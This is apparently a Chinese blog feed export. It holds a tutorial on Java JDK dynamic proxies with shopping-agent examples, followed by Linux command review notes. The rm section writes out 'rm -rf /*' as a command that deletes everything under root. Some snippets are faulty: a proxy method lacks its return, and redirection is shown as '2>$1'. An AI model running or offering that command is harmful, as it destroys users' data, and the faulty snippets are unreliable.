<li>创建InvocationHandler接口的实现类，在invoke方法中完成代理类的功能<ol>
<li>调用目标方法</li>
<li>增强功能</li>
</ol>
</li>
<li>使用Proxy类的<code>newProxyInstance</code>方法，来创建代理对象，代理对象来执行目标方法调用，其实是去执行handler中的invoke方法。invoke方法主要还是做两件事情：1.调用目标方法 2.功能增强。然后invoke返回目标方法执行结果。</li>
</ol>
<p>这里再写一个代购小demo：</p>
<p>如果说静态代理阶段，我是一个只会提供固定商品的代购，那么现在我强大了，我有一个小公司，我的公司旗下可以代购各种商品，对于代购每一种商品的员工，都有熟练且强大的业务能力。</p>
<p>那么我先写好我的“代购帝国公司”：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@auther</span> : 0range</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> : 2020 - 04 - 13 - 10:09 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LisonCompany</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//被代理的对象</span></span><br><span class="line">    <span class="keyword">private</span> Object factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getFactory</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFactory</span><span class="params">(Object factory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过Proxy获取动态代理的对象,他是用来调度员工的</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxyInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">  </span><br><span class="line"> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;<span class="comment">//这里面this就是InvocationHandler</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里就是通过动态代理对象来对方法进行增强</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        dobefore();</span><br><span class="line">        <span class="comment">//这里就是你要调用什么样的方法，作为参数传给我，我给你invoke</span></span><br><span class="line">        Object ret = method.invoke(factory,args);</span><br><span class="line">        doafter();</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//售前服务</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dobefore</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"售前服务，精美包装，快递一条龙服务！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//售后服务</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doafter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"售后服务，无忧退换货！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这之后需要新的功能，只需加类，加接口就可以完成实现。</p>
<p>这里再具体写一下，假设有两个水果工厂：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AppleFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeApple</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrangeFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeOrange</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别写好对应实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppleFactoryImpl</span> <span class="keyword">implements</span> <span class="title">AppleFactory</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeApple</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"新鲜大苹果！！！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrangeFactoryImpl</span> <span class="keyword">implements</span> <span class="title">OrangeFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeOrange</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"新鲜大橙子！！！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么代购客户端这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FruitClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//苹果工厂实现类</span></span><br><span class="line">        AppleFactory apl = <span class="keyword">new</span> AppleFactoryImpl();</span><br><span class="line">        <span class="comment">//代购公司成立了</span></span><br><span class="line">        LisonCompany lisonComp = <span class="keyword">new</span> LisonCompany();</span><br><span class="line">        <span class="comment">//代购公司目标是苹果</span></span><br><span class="line">        lisonComp.setFactory(apl);</span><br><span class="line">        <span class="comment">//分配1号员工来负责代购</span></span><br><span class="line">        AppleFactory lison1 = (AppleFactory)lisonComp.getProxyInstance();</span><br><span class="line">        <span class="comment">//代购苹果</span></span><br><span class="line">        lison1.makeApple();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"------------------------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//橙子工厂实现类</span></span><br><span class="line">        OrangeFactory org = (OrangeFactory) <span class="keyword">new</span> OrangeFactoryImpl();</span><br><span class="line">        <span class="comment">//代购公司目标是橙子</span></span><br><span class="line">        lisonComp.setFactory(org);</span><br><span class="line">        <span class="comment">//分配2号员工来负责代购</span></span><br><span class="line">        OrangeFactory lison2 = (OrangeFactory)lisonComp.getProxyInstance();</span><br><span class="line">        <span class="comment">//代购橙子</span></span><br><span class="line">        lison2.makeOrange();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">售前服务，精美包装，快递一条龙服务！</span><br><span class="line">新鲜大苹果！！！</span><br><span class="line">售后服务，无忧退换货！</span><br><span class="line">------------------------</span><br><span class="line">售前服务，精美包装，快递一条龙服务！</span><br><span class="line">新鲜大橙子！！！</span><br><span class="line">售后服务，无忧退换货！</span><br></pre></td></tr></table></figure>

<p>流程图：</p>
<p><img src="../images/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/167cff3ba6d23d8b.png" alt="img"></p>
<p>又写了一个好懂的版本：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Buyer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Factory realfactory = <span class="keyword">new</span> FactoryImpl();</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> Company(realfactory);</span><br><span class="line"></span><br><span class="line">        Factory fac = (Factory) Proxy.newProxyInstance(handler.getClass().getClassLoader(),realfactory.getClass().getInterfaces(),handler);</span><br><span class="line"></span><br><span class="line">        fac.make(<span class="string">"大苹果"</span>);</span><br><span class="line">        fac.taste(<span class="string">"大西瓜"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">make</span><span class="params">(String name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">taste</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FactoryImpl</span> <span class="keyword">implements</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">make</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"[*]买新鲜的"</span>+name);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">taste</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]尝一口"</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Company</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Object subject;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Company</span><span class="params">(Object subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"来代理咯！"</span>);</span><br><span class="line"></span><br><span class="line">        method.invoke(subject,args);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"代理完毕咯！"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>结果：</p>
<p><img src="../images/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/image-20200915151948096.png" alt="image-20200915151948096"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>JDK 动态代理</strong>：</p>
<ul>
<li>为了解决静态代理中，生成大量的代理类造成的冗余；</li>
<li>JDK 动态代理只需要实现 InvocationHandler 接口，重写 invoke 方法便可以完成代理的实现，</li>
<li>jdk的代理是利用反射生成代理类 Proxyxx.class 代理类字节码，并生成对象</li>
<li>jdk动态代理之所以<strong>只能代理接口</strong>是因为<strong>代理类本身已经extends了Proxy，而java是不允许多重继承的</strong>，但是允许实现多个接口</li>
<li><strong>优点</strong>：解决了静态代理中冗余的代理实现类问题。</li>
<li><strong>缺点</strong>：JDK 动态代理是基于接口设计实现的，如果没有接口，会抛异常。</li>
</ul>
<p>通用模式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">接口 os = <span class="keyword">new</span> 接口实现类()；</span><br><span class="line">Myhandler h = <span class="keyword">new</span> Myhandler(os)；<span class="comment">//内部重写invoke方法，增强目标方法。</span></span><br><span class="line">接口 proxy = Proxy.newproxyInstance(loader,interfaces,h);</span><br><span class="line">proxy.目标方法();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux温习笔记</title>
    <url>/Linux%E6%B8%A9%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>江山如画，一时多少豪杰。</p>
</blockquote>
<p>今天来复习一下Linux基础知识。</p>
<a id="more"></a>

<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><p><code>/</code>：根目录，所有用户共享的目录，就是树根</p>
<p><code>~</code>：家目录，用户的个人目录</p>
<p>用户<code>tom</code>的家目录：<code>/home/tom</code></p>
<p>用户<code>root</code>的家目录：<code>/root</code></p>
<p><code>#</code>：root</p>
<p><code>$</code>：普通用户</p>
<h1 id="各种命令"><a href="#各种命令" class="headerlink" title="各种命令"></a>各种命令</h1><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><blockquote>
<p>ls [选项] [参数] :   ls -l /etc</p>
</blockquote>
<p>目录内容查看</p>
<p>选项：</p>
<ul>
<li><code>-a</code>：显示所有文件（包括隐藏文件）</li>
<li><code>-l</code>：长格式显示；<code>ls -l</code>可以简写成<code>ll</code></li>
</ul>
<p>权限 | 引用次数 | user | group | size(bytes) | 最后修改时间</p>
<ul>
<li><code>-lh</code>：人类化显示，KB、MB…</li>
<li><code>-ld</code>：查看目录本身的信息</li>
<li><code>-li</code>：查看文件的inode节点</li>
</ul>
<p><code>-rw-r--r--</code>: -|user|group|others</p>
<ul>
<li>第一个<code>-</code>含义：<ul>
<li>-：文件</li>
<li>d：目录</li>
<li>l：软链接</li>
</ul>
</li>
<li><code>rw-</code>含义：<ul>
<li>user有read、write权限</li>
</ul>
</li>
<li><code>r--</code>含义：<ul>
<li>group只有read权限</li>
</ul>
</li>
<li><code>r--</code>含义：<ul>
<li>其他人只有read权限</li>
</ul>
</li>
</ul>
<h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h2><blockquote>
<p>mkdir [选项] [目录名，路径]</p>
</blockquote>
<p>创建新目录</p>
<p>选项：</p>
<ul>
<li><code>-p</code>：迭代创建。在目录本身不存在的情况下，创建新目录(子目录)</li>
</ul>
<h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><blockquote>
<p>cd [目录路径] ：cd  /tmp</p>
</blockquote>
<p>切换目录</p>
<h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><p>显示当前目录</p>
<p>.    ：当前目录</p>
<p>..    ：上一级目录</p>
<h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><blockquote>
<p>cp [选项]  [源文件目录] [目标文件目录] </p>
</blockquote>
<p>复制文件或目录</p>
<p>选项：</p>
<ul>
<li><code>-r</code>：复制目录</li>
<li><code>-p</code>：复制目录时保留文件属性（修改时间等信息）</li>
</ul>
<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><blockquote>
<p>mv [源路径] [目标路径]</p>
</blockquote>
<p>剪切、改名</p>
<p><code>mv test test1</code>：将目前目录下的文件test改名为test1</p>
<p><code>mv test1 test2 test3 test4</code>：源路径可以多个一起复制（1，2，3 -&gt; 4)</p>
<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><blockquote>
<p>rm [选项] [路径]</p>
</blockquote>
<p>删除文件或目录</p>
<p>选项：</p>
<ul>
<li><code>-f</code>：默认强制删除</li>
<li><code>-r</code>：删除目录</li>
</ul>
<p><code>rm -rf /*</code>：将根目录下的一切删除</p>
<h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h2><p>创建空文件</p>
<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><blockquote>
<p>cat [选项] [文件路径]</p>
</blockquote>
<p>显示文件内容</p>
<p>选项：</p>
<ul>
<li><code>-n</code>：显示行号</li>
<li><code>-A</code>：查看所有内容，包含隐藏文件 <code>ls -a</code></li>
</ul>
<p>##tac</p>
<blockquote>
<p>tac [选项] [文件路径]</p>
</blockquote>
<p>文件倒着显示，从最后一行倒着显示</p>
<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>分页显示文件内容</p>
<p>进入浏览状态后：</p>
<ul>
<li>空格键/f：翻页</li>
<li>enter：逐行显示</li>
<li>q/Q：退出</li>
<li>B/b：返回上一页</li>
</ul>
<h2 id="less"><a href="#less" class="headerlink" title="less"></a>less</h2><p>与more相同，但可以用⬆️方向键向上翻页</p>
<p>也可以搜索关键词：</p>
<p><code>/+keyword</code>：寻找关键词，<code>n</code>向下找</p>
<p>##head</p>
<p><code>head -n 20 /etc/services.conf</code>：查看前20行内容</p>
<p>如果不写-n 20，那么默认显示前10行</p>
<h2 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h2><p><code>tail -n 20 /etc/services.conf</code>：查看尾部后20行</p>
<p>如果不写，也是默认后10行</p>
<h2 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h2><blockquote>
<p>ln [选项] [源文件] [目标文件]</p>
</blockquote>
<p>选项：</p>
<ul>
<li><code>-s</code>：创建软链接</li>
</ul>
<blockquote>
<p>软链接：通过文件路径访问，类似快捷方式；</p>
<p>硬链接：通过文件索引地址（inode）访问，</p>
<p>​                与<code>cp -p</code>不同的是，硬链接可以同步更新</p>
</blockquote>
<h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><blockquote>
<p>chmod [选项] [文件或目录]</p>
<p>Type1：</p>
<p>​    [{ugoa}{+-=}{rwx}] [文件或目录]</p>
<p>Type2:</p>
<p>​    [mode 421] [文件或目录]</p>
</blockquote>
<p>权限管理</p>
<p><code>-R</code>：递归修改，如果修改目录权限，那么目录内所有的文件都会修改</p>
<p>Type1：</p>
<p><code>u+x</code>：给user增加x权限</p>
<p><code>g+w</code>：给group增加write权限</p>
<p><code>o-r</code>：给other去掉read权限</p>
<p><code>g=rwx</code>：强制给group权限改为read、write、exe</p>
<p>Type2：</p>
<p>权限用数字显示</p>
<p><code>r=4,w=2,x=1</code></p>
<p><code>rwxrw-r--</code>：764</p>
<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><blockquote>
<p>find [选项] [搜索范围] [匹配条件]</p>
</blockquote>
<p>文件搜索</p>
<p><code>find /etc -name init</code>：在<code>/etc</code>下搜索文件init</p>
<p><code>-iname</code>：不区分大小写</p>
<p><code>*init*</code>：只要带init就可以</p>
<p><code>init???</code>：以init开头，后面有三个字符</p>
<p><code>-type</code>：按类型查找</p>
<p><code>-type -f/d/l</code>：按照文件/目录/软链接类型查找</p>
<h2 id="locate、which、whereis"><a href="#locate、which、whereis" class="headerlink" title="locate、which、whereis"></a>locate、which、whereis</h2><p><code>which</code>：找到命令所在的目录</p>
<p><code>whereis</code>：会附带帮助文档的位置</p>
<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><blockquote>
<p>grep [选项] [关键词] [文件名或目录]</p>
</blockquote>
<p>搜寻特定行</p>
<p>选项：</p>
<p><code>-i</code>：不区分大小写</p>
<p><code>-n</code>：显示行号</p>
<p><code>-v</code>：反向搜索，排除指定字串</p>
<p>​        <code>grep -v ^# /etc/inittab</code>：不看行首带#注释的行</p>
<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><blockquote>
<p>man [命令或配置文件]</p>
</blockquote>
<p>查看帮助手册</p>
<h2 id="help、who、w"><a href="#help、who、w" class="headerlink" title="help、who、w"></a>help、who、w</h2><p><code>help</code>：查看shell内置命令的帮助手册</p>
<p><code>who</code>：查看登陆用户信息</p>
<p><code>w</code>：查看详细登录信息</p>
<h2 id="gzip、gunzip"><a href="#gzip、gunzip" class="headerlink" title="gzip、gunzip"></a>gzip、gunzip</h2><blockquote>
<p>.gz : linux常见的压缩格式</p>
<p>.zip : win、linux都可以识别，解压</p>
</blockquote>
<p><code>gzip 文件名</code>：压缩成.gz格式的压缩文件，压缩后<strong>不会保留</strong>源文件</p>
<p><code>gunzip 压缩文件</code>：将.gz文件解压成正常文件 </p>
<h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><blockquote>
<p>tar [-zcvf] [压缩后文件名] [待压缩目录]</p>
</blockquote>
<p>压缩目录，先打包，再压缩，格式<code>.tar.gz</code></p>
<p>选项：</p>
<p><code>-c</code>：打包</p>
<p><code>x</code>：解包</p>
<p><code>-v</code>：显示详细信息</p>
<p><code>-f</code>：指定文件名</p>
<p><code>-z</code>：打包同时压缩</p>
<p><code>zcvf</code>：打包</p>
<p><code>zxvf</code>：解包</p>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><blockquote>
<p>zip [选项] [压缩后文件名] [压缩目录]</p>
</blockquote>
<p>​    <code>-r</code>：压缩目录</p>
<h2 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h2><p><code>shutdown -h now/date</code>：关机</p>
<p><code>shutdown -r</code>：重启</p>
<p><code>shutdown -c</code>：取消上一条命令</p>
<h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><p><code>tty</code>：本地终端</p>
<p><code>pts</code>：远程终端</p>
<p>###write</p>
<blockquote>
<p>write &lt;用户名&gt; : 给在线用户名发消息，ctrl+D保存结束</p>
</blockquote>
<h3 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h3><blockquote>
<p>wall [message] : 广播信息，自己也会收到</p>
</blockquote>
<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><blockquote>
<p>ping -c : 指定发送次数</p>
</blockquote>
<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><blockquote>
<p>ifconfig etc0 [ip]： 给eth0配置ip地址</p>
</blockquote>
<h3 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h3><blockquote>
<p>mail [用户名]：查看，发送电子邮件</p>
</blockquote>
<h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><p>列出计算机用户登录信息</p>
<h3 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h3><blockquote>
<p>traceroute <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
</blockquote>
<p>显示数据包到主机之间的路径</p>
<h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p>查询网络状态</p>
<p>选项：</p>
<p><code>-t</code>：TCP</p>
<p><code>-u</code>：UDP</p>
<p><code>-l</code>：监听</p>
<p><code>-r</code>：路由</p>
<p><code>-n</code>：显示ip地址和端口号</p>
<p><code>-a</code>：所有，all</p>
<h1 id="软件包类别"><a href="#软件包类别" class="headerlink" title="软件包类别"></a>软件包类别</h1><ol>
<li>源码包<ol>
<li>C/C++编写，需手动安装</li>
</ol>
</li>
<li>二进制包<ol>
<li>经过编译的二进制包，不能再看见源代码</li>
<li>.rpm包：redhat，centOS</li>
<li>.ded包：debian，ubuntu</li>
</ol>
</li>
</ol>
<p>#SHELL命令</p>
<p>shell两大家族：</p>
<table>
<thead>
<tr>
<th align="center">Bourne shell</th>
<th align="left">C</th>
</tr>
</thead>
<tbody><tr>
<td align="center">sh</td>
<td align="left">csh</td>
</tr>
<tr>
<td align="center">ksh</td>
<td align="left">tcsh</td>
</tr>
<tr>
<td align="center">bash</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">psh</td>
<td align="left"></td>
</tr>
<tr>
<td align="center">zsh</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>查看支持shell种类：<code>vim /etc/shells</code></p>
<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>输出命令</p>
<p><code>echo -e</code>：支持<code>\</code>转义         </p>
<p> <code>#! /bin/bash</code></p>
<h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><blockquote>
<p>alias 别名 = ‘原命令’</p>
</blockquote>
<p>设置命令别名</p>
<p><code>alias</code>：查询命令别名</p>
<p><code>unalias</code>：删除别名</p>
<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><blockquote>
<p>history [选项] [历史命令保存文件] </p>
</blockquote>
<p>查看历史命令</p>
<p>选项：</p>
<p><code>-c</code>：清空历史命令</p>
<p><code>-w</code>：把缓存中的历史命令写入文件</p>
<p><code>～/.bash_history</code>：历史命令</p>
<p>##tricky</p>
<p><code>Ctrl+L</code>    清屏</p>
<p><code>Ctrl+U</code>    清空光标前命令、剪切</p>
<p><code>Ctrl+K</code>    清空光标后命令</p>
<p><code>Ctrl+Y</code>    粘贴</p>
<p><code>Ctrl+R</code>    在历史命令中搜索</p>
<p><code>Ctrl+D</code>    退出当前终端</p>
<p><code>Ctrl+A</code>    光标移至开头</p>
<p><code>Ctrl+E</code>    光标移至结尾</p>
<p>##重定向</p>
<p>标准输出重定向：</p>
<blockquote>
<p>命令    &gt;    文件    ：    覆盖</p>
<p>命令    &gt;&gt;    文件  ：   追加</p>
</blockquote>
<p>不管是否报错都保存：</p>
<blockquote>
<p>覆盖：命令    &gt;    文件    2&gt;$1</p>
<p>​            命令    &amp;&gt;    文件</p>
<p>追加：命令    &gt;&gt;    文件    2&gt;$1</p>
<p>​            命令    &amp;&gt;&gt;    文件</p>
</blockquote>
<p>正确保存1，错误保存2：</p>
<blockquote>
<p>命令    &gt;&gt;    文件1    2 &gt;&gt; 文件2    </p>
</blockquote>
<p>##管道符</p>
<blockquote>
<p>命令1 | 命令2        ：命令1的<strong>正确输出</strong>作为命令2的操作对象</p>
</blockquote>
<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>查看所有命令</p>
<p>unset</p>
<h2 id="多命令顺序执行"><a href="#多命令顺序执行" class="headerlink" title="多命令顺序执行"></a>多命令顺序执行</h2><p><code>;</code>：多个命令之间没有任何联系，顺序执行</p>
<p><code>&amp;&amp;</code>：<strong>逻辑与</strong></p>
<p>​        当<code>cmd1</code>正确执行，<code>cmd2</code>才会执行</p>
<p>​        当<code>cmd1</code>不正确，<code>cmd2</code>不会执行</p>
<p><code>||</code>：<strong>逻辑或</strong></p>
<p>​        当<code>cmd1</code>正确执行，<code>cmd2</code>就不会执行</p>
<p>​        当<code>cmd1</code>不正确，<code>cmd2</code>才会执行</p>
<p>例子：</p>
<p>判断命令是否正确：</p>
<p><code>cmd &amp;&amp; echo yes || echo no</code></p>
<p>脚本安装：</p>
<p><code>./configure &amp;&amp; make &amp;&amp; make install</code></p>
<h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>匹配文件名</p>
<p>具体含义：</p>
<p><code>?</code>：匹配任意一个字符，必须得有一个，不包含null</p>
<p><code>*</code>：匹配任意一个或多个任意字符，可以匹配任意内容，null也可以匹配到</p>
<p><code>[]</code>：匹配括号中的任意一个字符，必须得有一个</p>
<p><code>[-]</code>：<code>[a-z]</code>：匹配任意一个小写字母</p>
<p><code>[^]</code>：<strong>逻辑非</strong>，表示匹配不在中括号内的一个字符</p>
<p>​            <code>[^0-9]</code>：匹配一个任意一个不是0-9数字的字符</p>
<h2 id="其他特殊符号"><a href="#其他特殊符号" class="headerlink" title="其他特殊符号"></a>其他特殊符号</h2><p>单引号双引号的区别：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">name=sc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'$name'</span> =&gt;<span class="variable">$name</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$name</span>"</span> =&gt;sc</span><br></pre></td></tr></table></figure>

<p><code>$()</code>：用来执行系统命令</p>
<p><code>abc = $(date)</code>：将date执行，将结果赋值给abc变量的值</p>
<h1 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h1><p>永远滴神</p>
<p>没有菜单，只有命令</p>
<h2 id="方向键"><a href="#方向键" class="headerlink" title="方向键"></a>方向键</h2><table>
<thead>
<tr>
<th>H</th>
<th>J</th>
<th>K</th>
<th>L</th>
</tr>
</thead>
<tbody><tr>
<td>⬅️</td>
<td>⬇️</td>
<td>⬆️</td>
<td>➡️</td>
</tr>
</tbody></table>
<p><code>10j</code>：向下跳十行</p>
<p><code>10k</code>：向上跳10行</p>
<h2 id="行号"><a href="#行号" class="headerlink" title="行号"></a>行号</h2><p><code>:set nu</code>：设置行号</p>
<p><code>:set nonu</code>：取消行号</p>
<h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><p><code>a</code>：是从目前光标所在位置的下一个位置插入</p>
<p><code>A</code>：在光标所在行尾插入</p>
<p><code>i</code>：在光标所在的当前位置插入</p>
<p><code>I</code>：在光标所在行首插入</p>
<p><code>o</code>：在光标下一行插入一行，从行首开始输入文字</p>
<p><code>O</code>；在光标上插入新行</p>
<h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><p><code>gg</code>：到第一行</p>
<p><code>G</code>：到最后一行</p>
<p><code>:1000</code>：到1000行</p>
<p><code>$</code>：移动光标所在行的”行尾”</p>
